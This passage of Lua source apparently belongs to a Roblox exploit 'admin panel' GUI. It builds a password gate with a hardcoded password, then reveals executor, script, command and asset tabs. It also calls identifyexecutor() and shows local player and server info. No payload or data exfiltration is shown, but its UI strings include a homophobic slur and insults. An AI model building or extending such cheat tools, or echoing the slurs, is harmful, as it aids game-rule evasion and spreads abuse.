unable["main frame 4"].ZIndex = 24
unable["main frame 4"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["donut tab main frame 1"].Size = UDim2.new(0, 276, 0, 234)
unable["donut tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

unable["donut tab main frame 1"].BackgroundColor3 = unable["default background color"]

unable["donut tab main frame 1"].BorderColor3 = unable["default border color"]
unable["donut tab main frame 1"].BorderSizePixel = 1

unable["donut tab main frame 1"].Parent = unable["donut tab top bar"]
unable["donut tab main frame 1"].ZIndex = 9

unable["donut"].Size = UDim2.new(0, 268, 0, 225)
unable["donut"].Position = UDim2.new(0, 4, 0, 5)

unable["donut"].BackgroundColor3 = unable["default background color"]

unable["donut"].BorderColor3 = unable["default border color"]
unable["donut"].BorderSizePixel = 1

unable["donut"].Parent = unable["donut tab main frame 1"]
unable["donut"].ZIndex = 10

unable["donut"].Font = Enum.Font.RobotoMono
unable["donut"].TextColor3 = Color3.new(1, 1, 1)
unable["donut"].TextSize = 9
unable["donut"].TextWrapped = true
unable["donut"].TextXAlignment = Enum.TextXAlignment.Center
unable["donut"].TextYAlignment = Enum.TextYAlignment.Center
unable["donut"].Text = ""
unable["donut"].Name = "stay"

local A, B = 0, 0
local lastdonutupd = 0
local donutupdinterval = 0.1
local framebuffer = table.create(22)
local chars = (".,-~:;=!*#$@"):split("")

local sin, cos, floor, clamp = math.sin, math.cos, math.floor, math.clamp
local pi2 = math.pi * 2

if unable["is mobile?"] then
	unable["donut"].TextSize = 7
else
	unable["donut"].TextSize = 9
end

-------------------------------------------------------------------------------------------------------------------------------

unable["binary tab main frame 1"].Size = UDim2.new(0, 246, 0, 204)
unable["binary tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

unable["binary tab main frame 1"].BackgroundColor3 = unable["default background color"]

unable["binary tab main frame 1"].BorderColor3 = unable["default border color"]
unable["binary tab main frame 1"].BorderSizePixel = 1

unable["binary tab main frame 1"].Parent = unable["binary tab top bar"]
unable["binary tab main frame 1"].ZIndex = 12

unable["binary"].Size = UDim2.new(0, 238, 0, 195)
unable["binary"].Position = UDim2.new(0, 4, 0, 5)

unable["binary"].BackgroundColor3 = unable["default background color"]

unable["binary"].BorderColor3 = unable["default border color"]
unable["binary"].BorderSizePixel = 1

unable["binary"].Parent = unable["binary tab main frame 1"]
unable["binary"].ZIndex = 13

unable["binary"].Font = Enum.Font.RobotoMono
unable["binary"].TextColor3 = Color3.new(1, 1, 1)
unable["binary"].TextSize = 15
unable["binary"].TextWrapped = true
unable["binary"].TextXAlignment = Enum.TextXAlignment.Center
unable["binary"].TextYAlignment = Enum.TextYAlignment.Center
unable["binary"].ClipsDescendants = true
unable["binary"].Name = "stay"

unable["binary text padding"] = Instance.new("UIPadding")
unable["binary text padding"].PaddingBottom = UDim.new(0, 0)
unable["binary text padding"].Parent = unable["binary"]

local function grcl()
	local lines = {}
	for i = 1, 30 do
		table.insert(lines, grs(50))
	end
	return table.concat(lines, "\n")
end

local function grcl2()
	local lines = {}
	for i = 1, 30 do
		table.insert(lines, grs2(34))
	end
	return table.concat(lines, "\n")
end

function changebinary()
	unable["binary"].Text = grcl2()
end

-------------------------------------------------------------------------------------------------------------------------------

unable["block main frame"].Size = UDim2.new(0, 401, 0, 249)
unable["block main frame"].Position = UDim2.new(0, 0, 1, 1)

unable["block main frame"].BackgroundColor3 = unable["default background color"]

unable["block main frame"].BorderColor3 = unable["default border color"]
unable["block main frame"].BorderSizePixel = 1

unable["block main frame"].Parent = unable["top bar"]
unable["block main frame"].ZIndex = 48
unable["block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["donut tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
unable["donut tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

unable["donut tab block main frame"].BackgroundColor3 = unable["default background color"]

unable["donut tab block main frame"].BorderColor3 = unable["default border color"]
unable["donut tab block main frame"].BorderSizePixel = 1
unable["donut tab block main frame"].BackgroundTransparency = 1

unable["donut tab block main frame"].Parent = unable["donut tab top bar"]
unable["donut tab block main frame"].ZIndex = 10
unable["donut tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["donut tab block all"].Size = UDim2.new(0, 246, 0, 230)
unable["donut tab block all"].Position = UDim2.new(0, 0, 0, 0)

unable["donut tab block all"].BackgroundColor3 = unable["default background color"]

unable["donut tab block all"].BorderColor3 = unable["default border color"]
unable["donut tab block all"].BorderSizePixel = 1
unable["donut tab block all"].BackgroundTransparency = 0

unable["donut tab block all"].Parent = unable["donut tab top bar"]
unable["donut tab block all"].ZIndex = 11
unable["donut tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

unable["binary tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
unable["binary tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

unable["binary tab block main frame"].BackgroundColor3 = unable["default background color"]

unable["binary tab block main frame"].BorderColor3 = unable["default border color"]
unable["binary tab block main frame"].BorderSizePixel = 1
unable["binary tab block main frame"].BackgroundTransparency = 1

unable["binary tab block main frame"].Parent = unable["binary tab top bar"]
unable["binary tab block main frame"].ZIndex = 13
unable["binary tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["binary tab block all"].Size = UDim2.new(0, 276, 0, 260)
unable["binary tab block all"].Position = UDim2.new(0, 0, 0, 0)

unable["binary tab block all"].BackgroundColor3 = unable["default background color"]

unable["binary tab block all"].BorderColor3 = unable["default border color"]
unable["binary tab block all"].BorderSizePixel = 1
unable["binary tab block all"].BackgroundTransparency = 0

unable["binary tab block all"].Parent = unable["binary tab top bar"]
unable["binary tab block all"].ZIndex = 14
unable["binary tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

unable["password frame"].Size = UDim2.new(0, 401, 0, 249)
unable["password frame"].Position = UDim2.new(0, 0, 1, 1)

unable["password frame"].BackgroundColor3 = unable["default background color"]

unable["password frame"].BorderColor3 = unable["default border color"]
unable["password frame"].BorderSizePixel = 1

unable["password frame"].Parent = unable["top bar"]
unable["password frame"].ZIndex = 45
unable["password frame"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

unable["password text"].Size = UDim2.new(0, 393, 0, 241)
unable["password text"].Position = UDim2.new(0, 4, 0, 4)
unable["password text"].BackgroundColor3 = unable["default background color"]
unable["password text"].BorderColor3 = unable["default border color"]
unable["password text"].BackgroundTransparency = 0
unable["password text"].BorderSizePixel = 1
unable["password text"].Parent = unable["password frame"]
unable["password text"].Visible = true

unable["password text"].TextColor3 = unable["default border color"]
unable["password text"].Font = Enum.Font.RobotoMono
unable["password text"].TextSize = 15
unable["password text"].TextScaled = false
unable["password text"].Text = ""
unable["password text"].TextXAlignment = Enum.TextXAlignment.Center
unable["password text"].TextYAlignment = Enum.TextYAlignment.Center
unable["password text"].ZIndex = 45

unable["password text padding"] = Instance.new("UIPadding")
unable["password text padding"].PaddingBottom = UDim.new(0, 9)
unable["password text padding"].Parent = unable["password text"]

-------------------------------------------------------------------------------------------------------------------------------

unable["password label"] = Instance.new("TextLabel")
unable["password label"].Size = UDim2.new(0, 250, 0, 30)
unable["password label"].AnchorPoint = Vector2.new(0.5, 0.5)
unable["password label"].BackgroundTransparency = 0
unable["password label"].BorderSizePixel = 0
unable["password label"].TextColor3 = unable["default border color"]
unable["password label"].Font = Enum.Font.RobotoMono
unable["password label"].TextSize = 15
unable["password label"].Text = "enter the password ufag"
unable["password label"].TextXAlignment = Enum.TextXAlignment.Center
unable["password label"].TextYAlignment = Enum.TextYAlignment.Center
unable["password label"].ZIndex = 46
unable["password label"].Parent = unable["password text"]

-------------------------------------------------------------------------------------------------------------------------------

unable["password box"].Size = UDim2.new(0, 250, 0, 30)
unable["password box"].AnchorPoint = Vector2.new(0.5, 0.5)
unable["password box"].BackgroundColor3 = unable["default background color"]
unable["password box"].BorderColor3 = unable["default border color"]
unable["password box"].BackgroundTransparency = 0
unable["password box"].BorderSizePixel = 0
unable["password box"].Parent = unable["password text"]
unable["password box"].Visible = true

unable["password box"].TextColor3 = unable["default background color"]
unable["password box"].PlaceholderColor3 = unable["default 1/2 color"]
unable["password box"].Font = Enum.Font.RobotoMono
unable["password box"].TextTransparency = 1
unable["password box"].TextSize = 15
unable["password box"].TextScaled = false
unable["password box"].PlaceholderText = ""
unable["password box"].Text = ""
unable["password box"].TextXAlignment = Enum.TextXAlignment.Center
unable["password box"].TextYAlignment = Enum.TextYAlignment.Center
unable["password box"].ZIndex = 46
unable["password box"].ClipsDescendants = true

unable["password box padding"] = Instance.new("UIPadding")
unable["password box padding"].PaddingBottom = UDim.new(0, 2)
unable["password box padding"].Parent = unable["password box"]

-------------------------------------------------------------------------------------------------------------------------------

cancheck = true

unable["password check button"] = Instance.new("TextButton")
unable["password check button"].Size = UDim2.new(0, 250, 0, 30)
unable["password check button"].BackgroundColor3 = unable["default border color"]
unable["password check button"].AnchorPoint = Vector2.new(0.5, 0)
unable["password check button"].TextColor3 = Color3.new(1, 1, 1)
unable["password check button"].Font = Enum.Font.Nunito
unable["password check button"].TextSize = 15
unable["password check button"].Text = "check"
unable["password check button"].Parent = unable["password text"]
unable["password check button"].ZIndex = 48

unable["password check padding"] = Instance.new("UIPadding")
unable["password check padding"].PaddingBottom = UDim.new(0, 2)
unable["password check padding"].Parent = unable["password check"]

-------------------------------------------------------------------------------------------------------------------------------

unable["pw"] = "q"
unable["lmao"] = false
unable["typing"] = false
unable["typed"] = false
unable["cv"] = true

unable["password bullet label"] = Instance.new("TextLabel")
unable["password bullet label"].Name = "fakebox"
unable["password bullet label"].AnchorPoint = Vector2.new(0.5, 0.5)
unable["password bullet label"].Size = UDim2.new(0, 250, 0, 30)
unable["password bullet label"].BackgroundTransparency = 0
unable["password bullet label"].TextColor3 = unable["default 1/2 color"]
unable["password bullet label"].Font = Enum.Font.Nunito
unable["password bullet label"].TextSize = 15
unable["password bullet label"].TextScaled = false
unable["password bullet label"].TextXAlignment = Enum.TextXAlignment.Center
unable["password bullet label"].TextYAlignment = Enum.TextYAlignment.Center
unable["password bullet label"].ZIndex = 47
unable["password bullet label"].Text = "enter password"
unable["password bullet label"].TextTransparency = 0
unable["password bullet label"].Parent = unable["password text"]
unable["password bullet label"].ClipsDescendants = true

unable["password bullet label padding"] = Instance.new("UIPadding")
unable["password bullet label padding"].PaddingBottom = UDim.new(0, 2)
unable["password bullet label padding"].Parent = unable["password bullet label"]

unable["password fake cursor"] = Instance.new("TextLabel")
unable["password fake cursor"].AnchorPoint = Vector2.new(0.5, 0.5)
unable["password fake cursor"].Size = UDim2.new(0, 250, 0, 30)
unable["password fake cursor"].BackgroundTransparency = 1
unable["password fake cursor"].TextColor3 = unable["default 1/2 color"]
unable["password fake cursor"].Font = Enum.Font.Nunito
unable["password fake cursor"].TextSize = 15
unable["password fake cursor"].TextScaled = false
unable["password fake cursor"].TextXAlignment = Enum.TextXAlignment.Center
unable["password fake cursor"].TextYAlignment = Enum.TextYAlignment.Center
unable["password fake cursor"].ZIndex = 48
unable["password fake cursor"].Text = ""
unable["password fake cursor"].TextTransparency = 0
unable["password fake cursor"].Parent = unable["password text"]
unable["password fake cursor"].ClipsDescendants = true

unable["password fake cursor padding"] = Instance.new("UIPadding")
unable["password fake cursor padding"].PaddingBottom = UDim.new(0, 2)
unable["password fake cursor padding"].Parent = unable["password fake cursor"]

unable["password label"].Position = UDim2.new(0.5, 0, 0.5, - 13 - (18 + 17))
unable["password box"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))
unable["password check button"].Position = UDim2.new(0.5, 0, 0.5, 42 - (18 + 17))
unable["password bullet label"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))
unable["password fake cursor"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))

unable["max chars"] = 30

local function updbl()
	if #unable["password box"].Text > unable["max chars"] then
		unable["password box"].Text = unable["password box"].Text:sub(1, unable["max chars"])
	end

	local textLen = #unable["password box"].Text
	local hasText = textLen > 0

	if hasText then
		unable["password bullet label"].Text = string.rep("•", textLen)
	else
		unable["password bullet label"].Text = "enter password"
	end

	local spaces = string.rep(" ", textLen)
	if unable["typing"] then
		unable["password fake cursor"].Text = spaces .. (unable["cv"] and " " or "│")
	else
		unable["password fake cursor"].Text = spaces
	end
end

local function srcb()
	unable["typing"] = true
	while unable["typing"] do
		unable["cv"] = not unable["cv"]
		updbl()
		wait(0.3)
	end
end

local function stcb()
	unable["typing"] = false
	updbl()
end

unable["password box"]:GetPropertyChangedSignal("Text"):Connect(updbl)

unable["password box"].Focused:Connect(function()
	unable["password bullet label"].TextTransparency = 0
	updbl()
	srcb()
end)

unable["password box"].FocusLost:Connect(function()
	stcb()
	unable["typed"] = true
end)

unable["asset ids tab"].Visible = false
unable["commands tab"].Visible = false
unable["scripts tab"].Visible = false
unable["executor tab"].Visible = false
unable["introduction"].Visible = false

local entered = Instance.new("Sound")
entered.SoundId = "rbxassetid://8458409341"
entered.Parent = unable["local player"]
entered.Name = "canttouchthis"
entered.Volume = 0
entered.TimePosition = 0
spawn(function() entered:Play() end)

local function checkpass()
	playclicksound()
	stcb()
	if cancheck == true then
		cancheck = false
		if unable["password box"].Text == unable["pw"] then canpress = false
			entered.Volume = 1
			spawn(function() entered:Play() end)
			unable["unlocked"] = true
			unable["password label"].Text = "correct password uwuw"

			spawn(function()
				if not unable["unlocked"] then return end
				local tweens = {}
				for name, offset in pairs(showOffsets) do
					local smallButton = unable[name]
					smallButton.Visible = true
					local targetPosition = originalPositions[name] + offset
					local targetRotation = 0
					local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
					table.insert(tweens, tween)
				end
				for _, tween in ipairs(tweens) do
					tween.Completed:Wait()
				end
			end)

			spawn(function()
				unable["asset ids tab"].Visible = true
				unable["commands tab"].Visible = true
				unable["scripts tab"].Visible = true
				unable["executor tab"].Visible = true
				unable["introduction"].Visible = true

				unable["executor tab"].MouseButton1Click:Connect(function()
					playclicksound()
					unable["executor scrolling frame"].Visible = true
					unable["execute button"].Visible = true
					unable["execute from client button"].Visible = true
					unable["clear button"].Visible = true

					unable["next page"].Visible = false
					unable["previous page"].Visible = false
					unable["button holder"].Visible = false 
					unable["script search bar"].Visible = false

					unable["list of commands"].Visible = false
					unable["command bar"].Visible = false
					unable["execute command button"].Visible = false

					unable["asset id type indicator"].Visible = false
					unable["next page 2 button"].Visible = false
					unable["previous page 2 button"].Visible = false
					unable["switch asset id type button"].Visible = false
					unable["switch asset id type button 2"].Visible = false

					unable["introduction"]:Destroy()

					unable["copy asset id 3 button"].Visible = false
					unable["asset image id 3"].Visible = false
					unable["asset image name 3"].Visible = false
					unable["asset image 3"].Visible = false
					unable["copy asset id 2 button"].Visible = false
					unable["asset image id 2"].Visible = false
					unable["asset image name 2"].Visible = false
					unable["asset image 2"].Visible = false
					unable["copy asset id 1 button"].Visible = false
					unable["asset image id 1"].Visible = false
					unable["asset image name 1"].Visible = false
					unable["asset image 1"].Visible = false
				end)

				unable["scripts tab"].MouseButton1Click:Connect(function()
					playclicksound()

					unable["executor scrolling frame"].Visible = false
					unable["execute button"].Visible = false
					unable["execute from client button"].Visible = false
					unable["clear button"].Visible = false
					unable["list of commands"].Visible = false
					unable["command bar"].Visible = false
					unable["execute command button"].Visible = false
					unable["asset id type indicator"].Visible = false
					unable["next page 2 button"].Visible = false
					unable["previous page 2 button"].Visible = false
					unable["switch asset id type button"].Visible = false
					unable["switch asset id type button 2"].Visible = false
					if unable["introduction"] then
						unable["introduction"]:Destroy()
					end

					unable["copy asset id 3 button"].Visible = false
					unable["asset image id 3"].Visible = false
					unable["asset image name 3"].Visible = false
					unable["asset image 3"].Visible = false
					unable["copy asset id 2 button"].Visible = false
					unable["asset image id 2"].Visible = false
					unable["asset image name 2"].Visible = false
					unable["asset image 2"].Visible = false
					unable["copy asset id 1 button"].Visible = false
					unable["asset image id 1"].Visible = false
					unable["asset image name 1"].Visible = false
					unable["asset image 1"].Visible = false

					showScriptPage() 
					unable["script search bar"].Visible = true
				end)

				unable["commands tab"].MouseButton1Click:Connect(function()
					playclicksound()
					unable["executor scrolling frame"].Visible = false
					unable["execute button"].Visible = false
					unable["execute from client button"].Visible = false
					unable["clear button"].Visible = false

					unable["next page"].Visible = false
					unable["previous page"].Visible = false
					unable["button holder"].Visible = false
					unable["script search bar"].Visible = false

					unable["list of commands"].Visible = true
					unable["command bar"].Visible = true
					unable["execute command button"].Visible = true

					unable["asset id type indicator"].Visible = false
					unable["next page 2 button"].Visible = false
					unable["previous page 2 button"].Visible = false
					unable["switch asset id type button"].Visible = false
					unable["switch asset id type button 2"].Visible = false

					unable["introduction"]:Destroy()

					unable["copy asset id 3 button"].Visible = false
					unable["asset image id 3"].Visible = false
					unable["asset image name 3"].Visible = false
					unable["asset image 3"].Visible = false
					unable["copy asset id 2 button"].Visible = false
					unable["asset image id 2"].Visible = false
					unable["asset image name 2"].Visible = false
					unable["asset image 2"].Visible = false
					unable["copy asset id 1 button"].Visible = false
					unable["asset image id 1"].Visible = false
					unable["asset image name 1"].Visible = false
					unable["asset image 1"].Visible = false
				end)

				unable["asset ids tab"].MouseButton1Click:Connect(function()
					playclicksound()
					unable["executor scrolling frame"].Visible = false
					unable["execute button"].Visible = false
					unable["execute from client button"].Visible = false
					unable["clear button"].Visible = false
					unable["next page"].Visible = false
					unable["previous page"].Visible = false
					unable["button holder"].Visible = false
					unable["script search bar"].Visible = false

					unable["list of commands"].Visible = false
					unable["command bar"].Visible = false
					unable["execute command button"].Visible = false

					unable["asset id type indicator"].Visible = true
					unable["next page 2 button"].Visible = true
					unable["previous page 2 button"].Visible = true
					unable["switch asset id type button"].Visible = true
					unable["switch asset id type button 2"].Visible = true

					unable["introduction"]:Destroy()

					unable["copy asset id 3 button"].Visible = true
					unable["asset image id 3"].Visible = true
					unable["asset image name 3"].Visible = true
					unable["asset image 3"].Visible = true
					unable["copy asset id 2 button"].Visible = true
					unable["asset image id 2"].Visible = true
					unable["asset image name 2"].Visible = true
					unable["asset image 2"].Visible = true
					unable["copy asset id 1 button"].Visible = true
					unable["asset image id 1"].Visible = true
					unable["asset image name 1"].Visible = true
					unable["asset image 1"].Visible = true

					currentAssetIdPageIndex = savedAssetIdPageIndex
					updatePage()
				end)
			end)

			local repositionButton = unable["top bar reposition button"]
			local minimizeButton = unable["top bar minimize button"]
			local tweenService = unable["tween service"]

			local originalMinimizePos = minimizeButton.Position
			local newRepositionPos = UDim2.new(0, 331, 0, 4.7)

			minimizeButton.Position = newRepositionPos

			local repositionTween = tweenService:Create(repositionButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Position = newRepositionPos})
			repositionTween:Play()

			repositionTween.Completed:Wait()

			minimizeButton.Position = newRepositionPos

			unable["top bar minimize button"].Visible = false
			local minimizeTween = tweenService:Create(minimizeButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Position = originalMinimizePos})
			minimizeTween:Play()
			unable["top bar minimize button"].Visible = true

			unable["pwb"] = Instance.new("Frame")
			unable["pwb"].Size = UDim2.new(0, 401, 0, 249)
			unable["pwb"].Position = UDim2.new(0, 0, 1, 1)
			unable["pwb"].BackgroundColor3 = unable["default background color"]
			unable["pwb"].BorderColor3 = unable["default border color"]
			unable["pwb"].BorderSizePixel = 1
			unable["pwb"].Parent = unable["top bar"]
			unable["pwb"].BackgroundTransparency = 1
			unable["pwb"].ZIndex = 69

			local fadeIn = tweenService:Create(unable["pwb"], TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundTransparency = 0})
			fadeIn:Play()

			fadeIn.Completed:Connect(function()
				unable["password frame"]:Destroy()

				local shrink = tweenService:Create(unable["pwb"], TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Size = UDim2.new(0, 401, 0, 0)})
				shrink:Play()

				shrink.Completed:Connect(function()
					unable["pwb"]:Destroy() canpress = true canpress2 = true
				end)
			end)
		else
			local nay = Instance.new("Sound")
			nay.SoundId = "rbxassetid://8503529943"
			nay.Parent = unable["local player"]
			nay.Volume = 3.3
			nay.Name = "canttouchthis"
			nay.TimePosition = 0.01

			spawn(function() nay:Play() end)
			unable["password box"].Text = ""
			if unable["lmao"] == false then
				unable["lmao"] = true
				unable["typed"] = false
				unable["password bullet label"].Text = "enter password"
				unable["password bullet label"].TextTransparency = 0
				unable["password label"].Text = "wrong password fatass"
				wait(1)
				unable["lmao"] = false
				unable["password label"].Text = "enter the password ufag"
				cancheck = true
			end
		end
	end
end

unable["password check button"].MouseButton1Click:Connect(checkpass)

-------------------------------------------------------------------------------------------------------------------------------

local function cpf()
	while true do
		if (not unable["password frame"] or not unable["password frame"].Parent or unable["password frame"].Visible == false) 
			and unable["unlocked"] == false then
			if unable["screen gui"] then
				unable["screen gui"]:Destroy()
			end
			break
		end
		unable["run service"].Heartbeat:Wait()
	end
end

spawn(cpf)

-------------------------------------------------------------------------------------------------------------------------------

local loopEnabled = true

function toggleLoop(state)
	loopEnabled = state
	if state then
		startLoop()
	end
end

function startLoop()
	spawn(function()
		while loopEnabled do
			unable["toggle interface visibility button"].Text = unable["top bar"].Visible and "o.o" or ">.<"
			unable["run service"].Heartbeat:Wait()
		end
	end)
end

spawn(startLoop)

-------------------------------------------------------------------------------------------------------------------------------

unable["introduction"].Size = UDim2.new(0, 393, 0, 214)
unable["introduction"].Position = UDim2.new(0, 4, 0, 32)
unable["introduction"].BackgroundColor3 = unable["default background color"]
unable["introduction"].BorderColor3 = unable["default border color"]
unable["introduction"].BorderSizePixel = 1
unable["introduction"].Parent = unable["main frame 1"]
unable["introduction"].ZIndex = 19
unable["introduction"].Visible = true

unable["introduction"].TextColor3 = unable["default border color"]
unable["introduction"].Font = Enum.Font.RobotoMono
unable["introduction"].TextSize = 15
unable["introduction"].TextScaled = false
unable["introduction"].TextXAlignment = Enum.TextXAlignment.Center
unable["introduction"].TextYAlignment = Enum.TextYAlignment.Center
unable["introduction"].ZIndex = 19

unable["introduction text padding"] = Instance.new("UIPadding")
unable["introduction text padding"].PaddingBottom = UDim.new(0, 2)
unable["introduction text padding"].Parent = unable["introduction"]

unable["introduction"].Text = "welcome to unable's stupid admin panel [v".. unable["version"] .."]\n\ndeveloped and revived by unable aka meowsynther"

-------------------------------------------------------------------------------------------------------------------------------

unable["player information tab"].Size = UDim2.new(0, 133, 0, 26)
unable["player information tab"].Position = UDim2.new(0, 0, 0, 0)
unable["player information tab"].BackgroundColor3 = unable["default background color"]
unable["player information tab"].BorderColor3 = unable["default border color"]
unable["player information tab"].BorderSizePixel = 1
unable["player information tab"].TextColor3 = unable["default border color"]
unable["player information tab"].Font = Enum.Font.RobotoMono
unable["player information tab"].TextSize = 15
unable["player information tab"].TextScaled = false
unable["player information tab"].Text = "player info"
unable["player information tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["player information tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["player information tab text padding"] = Instance.new("UIPadding")
unable["player information tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["player information tab text padding"].Parent = unable["scripts tab"]
unable["player information tab"].Parent = unable["main frame 2"]
unable["player information tab"].ZIndex = 21

function fetchrig()
	local humanoid = unable["local player"].Character and unable["local player"].Character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		return humanoid.RigType.Name:upper()
	end
	return "n/a"
end

function fetchfriends()
	local success, result = pcall(function()
		return #unable["local player"]:GetFriendsOnline()
	end)
	return success and result or "n/a"
end

function fetchfriendsonline()
	local success, result = pcall(function()
		local friends = unable["local player"]:GetFriendsOnline()
		local playingSameGame = 0
		for _, friend in pairs(friends) do
			if friend.PlaceId and friend.PlaceId == game.PlaceId then
				playingSameGame += 1
			end
		end
		return playingSameGame
	end)
	return success and result or "n/a"
end

function fetchaccdate()
	local success, result = pcall(function()
		local timestamp = os.time() - (unable["local player"].AccountAge * 86400)
		return os.date("%Y-%m-%d", timestamp)
	end)
	return success and result or "n/a"
end

function fetchgamepasses()
	local success, result = pcall(function()
		return #game:GetService("MarketplaceService"):GetUserGamePassesAsync(unable["local player"].UserId)
	end)
	return success and result or "n/a"
end

function fetchbadges()
	local success, result = pcall(function()
		return #game:GetService("BadgeService"):GetBadgeInfoAsync(unable["local player"].UserId)
	end)
	return success and result or "n/a"
end

function fetchexecutor()
	if game.PlaceId == unable["test game"] then return "n/a" end
	return identifyexecutor()
end

function fetchdevice()
	local success, result = pcall(function()
		local platform = game:GetService("UserInputService"):GetPlatform()
		local device = "unknown"

		if platform == Enum.Platform.Windows then device = "pc"
		elseif platform == Enum.Platform.OSX then device = "mac"
		elseif platform == Enum.Platform.IOS then device = "ios"
		elseif platform == Enum.Platform.Android then device = "android"
		elseif platform == Enum.Platform.XBoxOne then device = "xbox"
		elseif platform == Enum.Platform.PS4 then device = "playstation" end

		if game:GetService("GuiService"):IsTenFootInterface() then
			device = device .. " (console)"
		elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then
			device = device .. " (mobile)"
		end

		return device
	end)
	return success and result or "n/a"
end

local displayName = unable["local player"].DisplayName or "n/a"
local username = "@" .. (unable["local player"].Name or "n/a")
local friendsCount = tonumber(fetchfriends()) or 0
local friendsInGame = tonumber(fetchfriendsonline()) or 0
local rigType = fetchrig() or "n/a"
local accountAge = tonumber(unable["local player"].AccountAge) or 0
local accountCreated = fetchaccdate() or "n/a"
local userId = tonumber(unable["local player"].UserId) or 0
local membershipType = unable["local player"].MembershipType.Name or "n/a"
local gamepassCount = tonumber(fetchgamepasses()) or 0
local badgeCount = tonumber(fetchbadges()) or 0
local executorInfo = fetchexecutor() or "n/a"
local deviceInfo = fetchdevice() or "n/a"

unable["player information tab"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["information holder"].Visible = true
	unable["server information holder"].Visible = false
	unable["output scrolling frame"].Visible = false
	unable["output holder"].Visible = false
	unable["console label"].Visible = false
	unable["clear console button"].Visible = false

	local informationText = string.format([[
user / display name: %s (%s)
user ID: %d
account age: %d days (created: %s)
membership: %s
friends online: %d
friends in game: %d
gamepasses owned: %d
badges owned: %d
rig type: %s
device: %s
executor: %s
    ]],
		displayName, 
		username, 
		userId, 
		accountAge, 
		accountCreated, 
		membershipType,
		friendsCount,
		friendsInGame,
		gamepassCount, 
		badgeCount, 
		rigType, 
		deviceInfo,
		executorInfo)

	unable["information holder"].Text = informationText
end)

spawn(function()
	local informationText = string.format([[
user / display name: %s (%s)
user ID: %d
account age: %d days (created: %s)
membership: %s
friends online: %d
friends in game: %d
gamepasses owned: %d
badges owned: %d
rig type: %s
device: %s
executor: %s
    ]],
		displayName, 
		username, 
		userId, 
		accountAge, 
		accountCreated, 
		membershipType,
		friendsCount,
		friendsInGame,
		gamepassCount, 
		badgeCount, 
		rigType, 
		deviceInfo,
		executorInfo)

	unable["information holder"].Text = informationText
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["server information tab"].Size = UDim2.new(0, 133, 0, 26)
unable["server information tab"].Position = UDim2.new(0, 134, 0, 0)
unable["server information tab"].BackgroundColor3 = unable["default background color"]
unable["server information tab"].BorderColor3 = unable["default border color"]
unable["server information tab"].BorderSizePixel = 1
unable["server information tab"].TextColor3 = unable["default border color"]
unable["server information tab"].Font = Enum.Font.RobotoMono
unable["server information tab"].TextSize = 15
unable["server information tab"].TextScaled = false
unable["server information tab"].Text = "server info"
unable["server information tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["server information tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["server information tab text padding"] = Instance.new("UIPadding")
unable["server information tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["server information tab text padding"].Parent = unable["scripts tab"]
unable["server information tab"].Parent = unable["main frame 2"]
unable["server information tab"].ZIndex = 21

function getPlayerCount()
	local success, result = pcall(function()
		return #game:GetService("Players"):GetPlayers()
	end)
	return success and result or "n/a"
end

function getFriendsInServer()
	local success, result = pcall(function()
		local friendsInServer = 0
		local localPlayer = game:GetService("Players").LocalPlayer
		for _, player in pairs(game:GetService("Players"):GetPlayers()) do
			if player ~= localPlayer and localPlayer:IsFriendsWith(player.UserId) then
				friendsInServer += 1
			end
		end
		return friendsInServer
	end)
	return success and result or "n/a"
end

function getPlaceId()
	return game.PlaceId or "n/a"
end

function getJobId()
	return game.JobId or "n/a"
end

function getGameName()
	local success, result = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	end)
	return success and result or "n/a"
end

function getCreatorInfo()
	local success, result = pcall(function()
		local creator = game.CreatorId
		local creatorType = game.CreatorType
		if creatorType == Enum.CreatorType.User then
			return game:GetService("Players"):GetNameFromUserIdAsync(creator)
		elseif creatorType == Enum.CreatorType.Group then
			local groupInfo = game:GetService("GroupService"):GetGroupInfoAsync(creator)
			return groupInfo.Name .. " (group)"
		end
	end)
	return success and result or "n/a"
end

function getCreatorInServer()
	local success, result = pcall(function()
		local creatorId = game.CreatorId
		local creatorType = game.CreatorType

		if creatorType == Enum.CreatorType.User then
			local creatorPlayer = game:GetService("Players"):GetPlayerByUserId(creatorId)
			return creatorPlayer and creatorPlayer.Name or false
		elseif creatorType == Enum.CreatorType.Group then
			local groupInfo = game:GetService("GroupService"):GetGroupInfoAsync(creatorId)
			local groupPlayers = game:GetService("Players"):GetPlayers()

			for _, player in ipairs(groupPlayers) do
				local rank = player:GetRankInGroup(creatorId)
				if rank >= 250 then
					return player.Name
				end
			end
		end
		return false
	end)
	return success and result or "n/a"
end

function getPing()
	local statsService = game:GetService("Stats")
	local ping = "n/a"

	spawn(function()
		if statsService and statsService.GetNetworkPing then
